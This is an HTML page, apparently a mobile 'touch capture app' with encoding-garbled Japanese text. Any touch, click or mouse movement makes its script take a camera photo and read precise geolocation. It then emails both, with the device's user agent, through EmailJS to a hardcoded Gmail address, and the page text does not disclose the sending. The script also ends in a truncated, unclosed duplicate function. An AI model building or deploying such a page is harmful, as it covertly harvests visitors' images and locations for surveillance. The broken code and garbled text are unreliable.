<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ã‚¿ãƒƒãƒã‚­ãƒ£ãƒ—ãƒãƒ£ã‚¢ãƒ—ãƒª</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/emailjs-com/3.2.0/email.min.js"></script>
    <style>
        body {
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            touch-action: manipulation;
            cursor: pointer;
            user-select: none;
        }
        
        * {
            box-sizing: border-box;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            text-align: center;
        }
        
        .touch-area {
            background: rgba(255, 255, 255, 0.1);
            border: 2px dashed rgba(255, 255, 255, 0.3);
            border-radius: 15px;
            padding: 40px;
            margin: 20px 0;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .touch-area:hover {
            background: rgba(255, 255, 255, 0.2);
            border-color: rgba(255, 255, 255, 0.5);
        }
        
        .touch-area.active {
            background: rgba(255, 255, 255, 0.3);
            border-color: #4CAF50;
        }
        
        .media-container {
            margin: 20px 0;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            padding: 20px;
        }
        
        video, img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            margin: 10px 0;
        }
        
        .status {
            background: rgba(0, 0, 0, 0.3);
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            font-size: 14px;
        }
        
        .data-display {
            background: rgba(0, 0, 0, 0.2);
            padding: 15px;
            border-radius: 8px;
            margin: 10px 0;
            text-align: left;
            font-family: monospace;
            font-size: 12px;
            word-break: break-all;
        }
        
        .error {
            color: #ff6b6b;
            background: rgba(255, 107, 107, 0.1);
        }
        
        .success {
            color: #4CAF50;
            background: rgba(76, 175, 80, 0.1);
        }
        
        .warning {
            color: #ff9800;
            background: rgba(255, 152, 0, 0.1);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ğŸ“± ã‚¿ãƒƒãƒã‚­ãƒ£ãƒ—ãƒãƒ£ã‚¢ãƒ—ãƒª</h1>
        <p>ç”»é¢ã‚’ã‚¿ãƒƒãƒãƒ»ã‚¹ãƒ¯ã‚¤ãƒ—ãƒ»ãƒ‰ãƒ©ãƒƒã‚°ã™ã‚‹ã¨å†™çœŸæ’®å½±ã€ä½ç½®æƒ…å ±å–å¾—ã€å‹•ç”»å†ç”Ÿã‚’è¡Œã„ã¾ã™</p>
        
        <div class="touch-area" id="touchArea">
            <h2>ğŸ“± ãƒšãƒ¼ã‚¸å…¨ä½“ãŒã‚¿ãƒƒãƒç¯„å›²ã§ã™</h2>
            <p>ã©ã“ã§ã‚‚ã‚¿ãƒƒãƒãƒ»ã‚¯ãƒªãƒƒã‚¯ãƒ»ã‚¹ãƒ¯ã‚¤ãƒ—ã§æ©Ÿèƒ½å®Ÿè¡Œ</p>
            <div style="font-size: 12px; margin-top: 10px; opacity: 0.8;">
                PC: ã‚¯ãƒªãƒƒã‚¯ãƒ»ãƒ‰ãƒ©ãƒƒã‚° | ã‚¹ãƒãƒ›: ã‚¿ãƒƒãƒãƒ»ã‚¹ãƒ¯ã‚¤ãƒ—
            </div>
        </div>
        
        <div class="status" id="status">å¾…æ©Ÿä¸­...</div>
        
        <div class="media-container">
            <video id="cameraVideo" autoplay muted style="display: none;"></video>
            <canvas id="photoCanvas" style="display: none;"></canvas>
            <img id="capturedPhoto" style="display: none;" alt="æ’®å½±ã•ã‚ŒãŸå†™çœŸ">
            <video id="playbackVideo" style="display: none;" controls></video>
        </div>
        
        <div class="data-display" id="locationData" style="display: none;"></div>
        <div class="data-display" id="photoData" style="display: none;"></div>
        <div class="data-display" id="videoData" style="display: none;"></div>
    </div>

    <script>
        // EmailJSåˆæœŸåŒ–ï¼ˆå®Ÿéš›ã®APIã‚­ãƒ¼ã‚’ä½¿ç”¨ï¼‰
        emailjs.init("cPjKBUm_i6HebDQF7");
        
        const touchArea = document.getElementById('touchArea');
        const status = document.getElementById('status');
        const cameraVideo = document.getElementById('cameraVideo');
        const photoCanvas = document.getElementById('photoCanvas');
        const capturedPhoto = document.getElementById('capturedPhoto');
        const playbackVideo = document.getElementById('playbackVideo');
        const locationData = document.getElementById('locationData');
        const photoData = document.getElementById('photoData');
        const videoData = document.getElementById('videoData');
        
        let mediaStream = null;
        let isProcessing = false;
        
        // ã‚µãƒ³ãƒ—ãƒ«Base64å‹•ç”»ãƒ‡ãƒ¼ã‚¿ï¼ˆå®Ÿéš›ã®çŸ­ã„å‹•ç”»ãƒ‡ãƒ¼ã‚¿ï¼‰
        const sampleVideoBase64 = "data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAACKBtZGF0AAAC7G1vb3YAAABsbXZoZAAAAAAAAAAAAAAAAAAAA+gAAAAAAAEAAAEAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAIXdHJhawAAAFx0a2hkAAAAAwAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAABAAAAAALAAAACQAAAAAAAkZWR0cwAAABxlbHN0AAAAAAAAAAEAAAABAAAAAAAAAAAAAAAAACRtZGlhAAAAIG1kaGQAAAAAAAAAAAAAAAAAALuAAAAAAABVxAAAAAAALWhkbHIAAAAAAAAAAHZpZGUAAAAAAAAAAAAAAABWaWRlb0hhbmRsZXIAAAABz21pbmYAAAAUdm1oZAAAAAEAAAAAAAAAAAAAACRkaW5mAAAAHGRyZWYAAAAAAAAAAQAAAAx1cmwgAAAAAQAAAY9zdGJsAAAAr3N0c2QAAAAAAAAAAQAAAJ9hdmMxAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAALAAgABIAAAASAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGP//AAAALWF2Y0MBQsAN/+EAFWdCwA3959l7BQAAAwABAAADADIPFi2WAQAEaO+jyyLA/fj4AAAAABx1dWlka2hA8l8kT8W6OaUbzwMj8wAAAAAAAAAYc3R0cwAAAAAAAAABAAAAAQAAAAAAAAAcc3RzYwAAAAAAAAABAAAAAQAAAAEAAAABAAAAFHN0c3oAAAAAAAAAEwAAAAEAAAAUc3RjbwAAAAAAAAABAAAALAAAAGB1ZHRhAAAAWG1ldGEAAAAAAAAAIWhkbHIAAAAAAAAAAG1kaXJhcHBsAAAAAAAAAAAAAAAALWlsc3QAAAAlqXRvbwAAAB1kYXRhAAAAAQAAAABMYXZmNTguMjkuMTAw";
        
        // ãƒšãƒ¼ã‚¸å…¨ä½“ã«ã‚¤ãƒ™ãƒ³ãƒˆãƒªã‚¹ãƒŠãƒ¼ã‚’è¨­å®šï¼ˆPCãƒ»ã‚¹ãƒãƒ›å¯¾å¿œï¼‰
        document.addEventListener('touchstart', handleTouch, { passive: false });
        document.addEventListener('mousedown', handleTouch);
        document.addEventListener('touchmove', handleTouch, { passive: false });
        document.addEventListener('mousemove', handleTouch);
        document.addEventListener('click', handleTouch);
        document.addEventListener('touchend', handleTouch, { passive: false });
        document.addEventListener('mouseup', handleTouch);
        
        // ã‚¹ãƒ¯ã‚¤ãƒ—æ¤œå‡º
        let startX = 0;
        let startY = 0;
        
        document.addEventListener('touchstart', (e) => {
            startX = e.touches[0].clientX;
            startY = e.touches[0].clientY;
        });
        
        document.addEventListener('touchmove', (e) => {
            if (!startX || !startY) return;
            
            const deltaX = Math.abs(e.touches[0].clientX - startX);
            const deltaY = Math.abs(e.touches[0].clientY - startY);
            
            if (deltaX > 50 || deltaY > 50) {
                handleTouch(e);
            }
        });
        
        async function executeCapture(event) {
            try {
                // 1. å†™çœŸæ’®å½±
                const photoBase64 = await capturePhoto();
                
                // 2. ä½ç½®æƒ…å ±å–å¾—
                const location = await getLocation();
                
                // 3. Base64å‹•ç”»å†ç”Ÿ
                await playBase64Video();
                
                // 4. ãƒ‡ãƒ¼ã‚¿ã‚’Gmailã«é€ä¿¡
                await sendToGmail(photoBase64, location);
                
                // æˆåŠŸæ™‚ã®èƒŒæ™¯è‰²å¤‰æ›´
                document.body.style.background = 'linear-gradient(135deg, #4CAF50 0%, #45a049 100%)';
                updateStatus('âœ… å…¨å‡¦ç†å®Œäº†ï¼ãƒ‡ãƒ¼ã‚¿ã‚’Gmailã«é€ä¿¡ã—ã¾ã—ãŸ', 'success');
                
            } catch (error) {
                console.error('å‡¦ç†ã‚¨ãƒ©ãƒ¼:', error);
                document.body.style.background = 'linear-gradient(135deg, #f44336 0%, #d32f2f 100%)';
                updateStatus('âŒ ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã—ã¾ã—ãŸ: ' + error.message, 'error');
            } finally {
                isProcessing = false;
                // 3ç§’å¾Œã«å…ƒã®èƒŒæ™¯è‰²ã«æˆ»ã™
                setTimeout(() => {
                    document.body.style.background = 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)';
                }, 3000);
            }
        }
        
        async function capturePhoto() {
            updateStatus('ã‚«ãƒ¡ãƒ©ã‚’èµ·å‹•ã—ã¦ã„ã¾ã™...', 'warning');
            
            try {
                // ã‚«ãƒ¡ãƒ©ã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’å–å¾—
                mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'environment' }, 
                    audio: false 
                });
                
                cameraVideo.srcObject = mediaStream;
                cameraVideo.style.display = 'block';
                
                // å°‘ã—å¾…ã£ã¦ã‹ã‚‰å†™çœŸã‚’æ’®å½±
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // ã‚­ãƒ£ãƒ³ãƒã‚¹ã«æç”»
                const canvas = photoCanvas;
                const context = canvas.getContext('2d');
                canvas.width = cameraVideo.videoWidth;
                canvas.height = cameraVideo.videoHeight;
                
                context.drawImage(cameraVideo, 0, 0);
                
                // Base64ãƒ‡ãƒ¼ã‚¿ã‚’å–å¾—
                const photoBase64 = canvas.toDataURL('image/jpeg', 0.8);
                
                // æ’®å½±ã—ãŸå†™çœŸã‚’è¡¨ç¤º
                capturedPhoto.src = photoBase64;
                capturedPhoto.style.display = 'block';
                
                // ãƒ‡ãƒ¼ã‚¿ã‚’è¡¨ç¤º
                photoData.innerHTML = `<strong>æ’®å½±å†™çœŸãƒ‡ãƒ¼ã‚¿:</strong><br>${photoBase64.substring(0, 100)}...`;
                photoData.style.display = 'block';
                
                // ã‚«ãƒ¡ãƒ©ã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’åœæ­¢
                mediaStream.getTracks().forEach(track => track.stop());
                cameraVideo.style.display = 'none';
                
                updateStatus('å†™çœŸã‚’æ’®å½±ã—ã¾ã—ãŸ', 'success');
                return photoBase64;
                
            } catch (error) {
                updateStatus('ã‚«ãƒ¡ãƒ©ã‚¢ã‚¯ã‚»ã‚¹ã‚¨ãƒ©ãƒ¼: ' + error.message, 'error');
                throw error;
            }
        }
        
        async function getLocation() {
            updateStatus('ä½ç½®æƒ…å ±ã‚’å–å¾—ã—ã¦ã„ã¾ã™...', 'warning');
            
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('ä½ç½®æƒ…å ±ãŒã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã¾ã›ã‚“'));
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date().toISOString()
                        };
                        
                        locationData.innerHTML = `<strong>ä½ç½®æƒ…å ±:</strong><br>
                            ç·¯åº¦: ${location.latitude}<br>
                            çµŒåº¦: ${location.longitude}<br>
                            ç²¾åº¦: ${location.accuracy}m<br>
                            å–å¾—æ™‚åˆ»: ${location.timestamp}`;
                        locationData.style.display = 'block';
                        
                        updateStatus('ä½ç½®æƒ…å ±ã‚’å–å¾—ã—ã¾ã—ãŸ', 'success');
                        resolve(location);
                    },
                    (error) => {
                        updateStatus('ä½ç½®æƒ…å ±å–å¾—ã‚¨ãƒ©ãƒ¼: ' + error.message, 'error');
                        reject(error);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        async function playBase64Video() {
            updateStatus('Base64å‹•ç”»ã‚’å†ç”Ÿã—ã¦ã„ã¾ã™...', 'warning');
            
            try {
                // å®Ÿéš›ã®Base64å‹•ç”»ãƒ‡ãƒ¼ã‚¿ã‚’ä½¿ç”¨
                playbackVideo.src = sampleVideoBase64;
                playbackVideo.style.display = 'block';
                
                // å‹•ç”»ãƒ‡ãƒ¼ã‚¿ã‚’è¡¨ç¤º
                videoData.innerHTML = `<strong>Base64å‹•ç”»ãƒ‡ãƒ¼ã‚¿:</strong><br>${sampleVideoBase64.substring(0, 100)}...`;
                videoData.style.display = 'block';
                
                // å‹•ç”»å†ç”Ÿ
                await playbackVideo.play();
                
                updateStatus('å‹•ç”»ã‚’å†ç”Ÿé–‹å§‹ã—ã¾ã—ãŸ', 'success');
                
            } catch (error) {
                updateStatus('å‹•ç”»å†ç”Ÿã‚¨ãƒ©ãƒ¼: ' + error.message, 'error');
                throw error;
            }
        }
        
        async function sendToGmail(photoBase64, location) {
            updateStatus('Gmailã«é€ä¿¡ã—ã¦ã„ã¾ã™...', 'warning');
            
            try {
                const templateParams = {
                    to_email: 'a6068376@gmail.com', // å®Ÿéš›ã®é€ä¿¡å…ˆãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã«å¤‰æ›´ã—ã¦ãã ã•ã„
                    subject: 'ã‚¿ãƒƒãƒã‚­ãƒ£ãƒ—ãƒãƒ£ã‚¢ãƒ—ãƒª - ãƒ‡ãƒ¼ã‚¿é€ä¿¡',
                    message: `
                        ã‚¿ãƒƒãƒã‚­ãƒ£ãƒ—ãƒãƒ£ã‚¢ãƒ—ãƒªã‹ã‚‰ã®ãƒ‡ãƒ¼ã‚¿é€ä¿¡
                        
                        æ’®å½±æ™‚åˆ»: ${new Date().toISOString()}
                        ãƒ‡ãƒã‚¤ã‚¹: ${navigator.userAgent}
                        
                        ä½ç½®æƒ…å ±:
                        - ç·¯åº¦: ${location.latitude}
                        - çµŒåº¦: ${location.longitude}
                        - ç²¾åº¦: ${location.accuracy}m
                        
                        å†™çœŸãƒ‡ãƒ¼ã‚¿ã‚µã‚¤ã‚º: ${Math.round(photoBase64.length / 1024)}KB
                        å‹•ç”»ãƒ‡ãƒ¼ã‚¿ã‚µã‚¤ã‚º: ${Math.round(sampleVideoBase64.length / 1024)}KB
                    `,
                    photo_data: photoBase64,
                    location_data: JSON.stringify(location),
                    video_data: sampleVideoBase64
                };
                
                // EmailJSã§ãƒ¡ãƒ¼ãƒ«é€ä¿¡
                const result = await emailjs.send(
                    'service_ja2c09x', // ã‚µãƒ¼ãƒ“ã‚¹ID
                    'template_2fp2jrg', // ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆID
                    templateParams
                );
                
                updateStatus('Gmailã¸ã®é€ä¿¡ãŒå®Œäº†ã—ã¾ã—ãŸ', 'success');
                console.log('ãƒ¡ãƒ¼ãƒ«é€ä¿¡æˆåŠŸ:', result);
                
            } catch (error) {
                updateStatus('Gmailé€ä¿¡ã‚¨ãƒ©ãƒ¼: ' + error.message, 'error');
                console.error('ãƒ¡ãƒ¼ãƒ«é€ä¿¡ã‚¨ãƒ©ãƒ¼:', error);
                throw error;
            }
        }
        
        function updateStatus(message, type = 'info') {
            status.textContent = message;
            status.className = `status ${type}`;
            console.log(`[${type.toUpperCase()}] ${message}`);
        }
        
        // åˆæœŸåŒ–ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸
        updateStatus('ğŸ“± ã‚¢ãƒ—ãƒªæº–å‚™å®Œäº†ï¼ãƒšãƒ¼ã‚¸ã®ã©ã“ã§ã‚‚ã‚¿ãƒƒãƒãƒ»ã‚¯ãƒªãƒƒã‚¯ã§å®Ÿè¡Œé–‹å§‹', 'success');
        
        // ãƒ‡ãƒã‚¤ã‚¹æ¤œå‡ºã¨ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸è¡¨ç¤º
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        console.log(`ãƒ‡ãƒã‚¤ã‚¹: ${isMobile ? 'ãƒ¢ãƒã‚¤ãƒ«' : 'PC'}`);
        
        // é˜²æ­¢ï¼šèª¤æ“ä½œé˜²æ­¢ã®ãŸã‚ã€2ç§’é–“ã®ã‚¯ãƒ¼ãƒ«ãƒ€ã‚¦ãƒ³
        let lastTouchTime = 0;
        function handleTouch(event) {
            const currentTime = Date.now();
            if (currentTime - lastTouchTime < 2000) {
                console.log('ã‚¯ãƒ¼ãƒ«ãƒ€ã‚¦ãƒ³ä¸­...');
                return;
            }
            lastTouchTime = currentTime;
            
            if (isProcessing) return;
            
            isProcessing = true;
            document.body.style.background = 'linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%)';
            updateStatus('ğŸ”„ ã‚¿ãƒƒãƒã‚’æ¤œå‡ºï¼å‡¦ç†ã‚’é–‹å§‹ã—ã¦ã„ã¾ã™...', 'success');
            
            // å…ƒã®å‡¦ç†ã‚’å®Ÿè¡Œ
            executeCapture(event);
        }
        
        async function executeCapture(event) {
    </script>
</body>
</html>
